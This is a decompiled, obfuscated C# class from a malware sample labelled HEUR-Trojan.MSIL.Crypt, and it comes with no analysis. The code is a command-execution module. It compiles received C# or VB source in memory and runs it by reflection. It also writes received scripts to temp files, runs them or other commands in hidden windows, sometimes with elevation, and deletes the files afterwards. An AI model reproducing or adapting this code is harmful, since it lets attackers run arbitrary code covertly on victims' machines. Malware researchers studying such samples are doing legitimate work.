// Decompiled with JetBrains decompiler
// Type: @ӿ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using Microsoft.CSharp;
using Microsoft.VisualBasic;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;

internal sealed class \u0040ӿ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u00374i() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u003762() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӿ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1 = \u0040ӿ.\u0040Ӻ() ? 3 : 2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_1;
        case 1:
        case 3:
          goto label_2;
        case 4:
          goto label_5;
        default:
          num1 = 4;
          continue;
      }
    }
label_1:
    \u0040ӿ.\u0040ӕ();
label_2:
    \u0040ӿ.\u0040Ӗ((object) this);
label_5:
    try
    {
      Dictionary<string, string> dictionary1 = _param2.\u0040ӗ<Dictionary<string, string>>();
      Dictionary<string, object> dictionary2 = _param2.\u0040ӗ<Dictionary<string, object>>();
      if (\u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(2988)) || \u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(2996)))
      {
        CodeDomProvider codeDomProvider = !\u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(2988)) ? (CodeDomProvider) new VBCodeProvider() : (CodeDomProvider) new CSharpCodeProvider();
        CompilerParameters compilerParameters1 = new CompilerParameters();
        \u0040ӿ.\u0040ә((object) compilerParameters1, true);
        \u0040ӿ.\u0040Ӛ((object) compilerParameters1, false);
        CompilerParameters compilerParameters2 = compilerParameters1;
        \u0040ӿ.\u0040ӝ(\u0040ӿ.\u0040ӛ((object) compilerParameters2), \u0040ӿ.\u0040Ӝ((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(3004)], (object) new char[1]
        {
          '\n'
        }));
        CompilerResults compilerResults = (CompilerResults) \u0040ӿ.\u0040Ӟ((object) codeDomProvider, (object) compilerParameters2, (object) new string[1]
        {
          dictionary1[(string) \u0040ӿ.\u0040ӗ(3028)]
        });
        if (\u0040ӿ.\u0040Ӡ(\u0040ӿ.\u0040ӟ((object) compilerResults)))
        {
          string str = "";
          IEnumerator enumerator = (IEnumerator) \u0040ӿ.\u0040ӡ(\u0040ӿ.\u0040ӟ((object) compilerResults));
          try
          {
            while (\u0040ӿ.\u0040ӧ((object) enumerator))
            {
              CompilerError compilerError = (CompilerError) \u0040ӿ.\u0040Ӣ((object) enumerator);
              \u0040ӿ.\u0040Ӻ();
              int num2;
              if (\u0040ӿ.\u0040ӹ())
              {
                if (\u0040ӿ.\u0040ӹ())
                {
                  num2 = 2;
                  goto label_13;
                }
              }
              else
                goto label_14;
label_12:
              str = (string) \u0040ӿ.\u0040Ӧ((object) new string[8]
              {
                str,
                (string) \u0040ӿ.\u0040ӗ(3040),
                (string) \u0040ӿ.\u0040ӣ((object) compilerError),
                (string) \u0040ӿ.\u0040ӗ(3046),
                \u0040ӿ.\u0040Ӥ((object) compilerError).ToString(),
                (string) \u0040ӿ.\u0040ӗ(3058),
                (string) \u0040ӿ.\u0040ӥ((object) compilerError),
                (string) \u0040ӿ.\u0040ӗ(3078)
              });
              continue;
label_13:
              switch (num2)
              {
                case 0:
                case 2:
                  goto label_12;
                default:
                  continue;
              }
label_14:
              num2 = 3;
              goto label_13;
            }
          }
          finally
          {
            if (enumerator is IDisposable disposable)
              \u0040ӿ.\u0040Ө((object) disposable);
          }
          this.\u0040ӓ = (object) str;
          this.\u0040Ӕ = 1;
          return;
        }
        object obj = \u0040ӿ.\u0040Ӫ(\u0040ӿ.\u0040ө((object) compilerResults), \u0040ӿ.\u0040ӗ(3086));
        foreach (MethodInfo method in obj.GetType().GetMethods())
        {
          if (\u0040ӿ.\u0040Ә(\u0040ӿ.\u0040ӫ((object) method), \u0040ӿ.\u0040ӗ(3110)))
          {
            \u0040ӿ.\u0040Ӭ((object) method, obj, (object) null);
            break;
          }
        }
      }
      else if (\u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(3122)))
      {
        string str = (string) \u0040ӿ.\u0040ӭ((object) \u0040ԝ.\u0040Ծ(), \u0040ӿ.\u0040ӗ(1604), (object) \u0040ԝ.\u0040\u05CB(10), \u0040ӿ.\u0040ӗ(1610));
        \u0040ӿ.\u0040Ӯ((object) str, (object) dictionary1[(string) \u0040ӿ.\u0040ӗ(3028)]);
        if ((bool) dictionary2[(string) \u0040ӿ.\u0040ӗ(1176)])
        {
          ProcessStartInfo processStartInfo = new ProcessStartInfo();
          \u0040ӿ.\u0040ӯ((object) processStartInfo, ProcessWindowStyle.Hidden);
          \u0040ӿ.\u0040Ӱ((object) processStartInfo, \u0040ԝ.\u0040؜() ? \u0040ӿ.\u0040ӗ(1884) : (object) "");
          \u0040ӿ.\u0040ӱ((object) processStartInfo, true);
          \u0040ӿ.\u0040Ӳ((object) processStartInfo, (object) str);
          \u0040ӿ.\u0040Ӵ(\u0040ӿ.\u0040ӳ((object) processStartInfo));
        }
        else
        {
          ProcessStartInfo processStartInfo = new ProcessStartInfo();
          \u0040ӿ.\u0040ӱ((object) processStartInfo, false);
          \u0040ӿ.\u0040Ӱ((object) processStartInfo, \u0040ԝ.\u0040؜() ? \u0040ӿ.\u0040ӗ(1884) : (object) "");
          \u0040ӿ.\u0040Ӳ((object) processStartInfo, \u0040ӿ.\u0040ӗ(3132));
          \u0040ӿ.\u0040Ӷ((object) processStartInfo, \u0040ӿ.\u0040ӵ(\u0040ӿ.\u0040ӗ(3150), (object) str, \u0040ӿ.\u0040ӗ(1878)));
          \u0040ӿ.\u0040Ӵ(\u0040ӿ.\u0040ӳ((object) processStartInfo));
        }
        try
        {
          \u0040ӿ.\u0040ӷ((object) str);
        }
        catch
        {
        }
      }
      else if (\u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(3162)))
      {
        string str = (string) \u0040ӿ.\u0040ӭ((object) \u0040ԝ.\u0040Ծ(), \u0040ӿ.\u0040ӗ(1604), (object) \u0040ԝ.\u0040\u05CB(10), \u0040ӿ.\u0040ӗ(3172));
        \u0040ӿ.\u0040Ӯ((object) str, (object) dictionary1[(string) \u0040ӿ.\u0040ӗ(3028)]);
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        \u0040ӿ.\u0040ӯ((object) processStartInfo, ProcessWindowStyle.Hidden);
        \u0040ӿ.\u0040Ӱ((object) processStartInfo, \u0040ԝ.\u0040؜() ? \u0040ӿ.\u0040ӗ(1884) : (object) "");
        \u0040ӿ.\u0040Ӳ((object) processStartInfo, \u0040ӿ.\u0040ӗ(3184));
        \u0040ӿ.\u0040Ӷ((object) processStartInfo, \u0040ӿ.\u0040ӵ(\u0040ӿ.\u0040ӗ(3210), (object) str, \u0040ӿ.\u0040ӗ(1878)));
        \u0040ӿ.\u0040Ӵ(\u0040ӿ.\u0040ӳ((object) processStartInfo));
        try
        {
          \u0040ӿ.\u0040ӷ((object) str);
        }
        catch
        {
        }
      }
      else if (\u0040ӿ.\u0040Ә((object) dictionary1[(string) \u0040ӿ.\u0040ӗ(1356)], \u0040ӿ.\u0040ӗ(3234)))
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        \u0040ӿ.\u0040ӯ((object) processStartInfo, ProcessWindowStyle.Hidden);
        \u0040ӿ.\u0040Ӱ((object) processStartInfo, \u0040ԝ.\u0040؜() ? \u0040ӿ.\u0040ӗ(1884) : (object) "");
        \u0040ӿ.\u0040Ӳ((object) processStartInfo, \u0040ӿ.\u0040ӗ(3242));
        \u0040ӿ.\u0040Ӷ((object) processStartInfo, \u0040ӿ.\u0040ӵ(\u0040ӿ.\u0040ӗ(3274), (object) dictionary1[(string) \u0040ӿ.\u0040ӗ(3028)], \u0040ӿ.\u0040ӗ(1878)));
        \u0040ӿ.\u0040Ӵ(\u0040ӿ.\u0040ӳ((object) processStartInfo));
      }
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӿ.\u0040Ӹ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ә(object _param0, object _param1) => (string) _param0 == (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0, bool _param1) => ((CompilerParameters) _param0).GenerateInMemory = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӛ(object _param0, bool _param1) => ((CompilerParameters) _param0).GenerateExecutable = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((CompilerParameters) _param0).ReferencedAssemblies;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0, object _param1) => (object) ((string) _param0).Split((char[]) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӝ(object _param0, object _param1) => ((StringCollection) _param0).AddRange((string[]) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӟ(object _param0, object _param1, object _param2) => (object) ((CodeDomProvider) _param0).CompileAssemblyFromSource((CompilerParameters) _param1, (string[]) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӟ(object _param0) => (object) ((CompilerResults) _param0).Errors;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӡ(object _param0) => ((CompilerErrorCollection) _param0).HasErrors;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӡ(object _param0) => (object) ((CollectionBase) _param0).GetEnumerator();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ(object _param0) => ((IEnumerator) _param0).Current;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӣ(object _param0) => (object) ((CompilerError) _param0).ErrorNumber;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӥ(object _param0) => ((CompilerError) _param0).Line;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӥ(object _param0) => (object) ((CompilerError) _param0).ErrorText;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӧ(object _param0) => (object) string.Concat((string[]) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӧ(object _param0) => ((IEnumerator) _param0).MoveNext();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ө(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ө(object _param0) => (object) ((CompilerResults) _param0).CompiledAssembly;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӫ(object _param0, object _param1) => ((Assembly) _param0).CreateInstance((string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӫ(object _param0) => (object) ((MemberInfo) _param0).Name;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӭ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӭ(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӯ(object _param0, object _param1) => File.WriteAllText((string) _param0, (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӯ(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӱ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Verb = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӱ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӳ(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӳ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӵ(object _param0) => ((Process) _param0).WaitForExit();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӵ(object _param0, object _param1, object _param2) => (object) ((string) _param0 + (string) _param1 + (string) _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӷ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Arguments = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӷ(object _param0) => File.Delete((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӹ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӹ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӻ() => false;
}
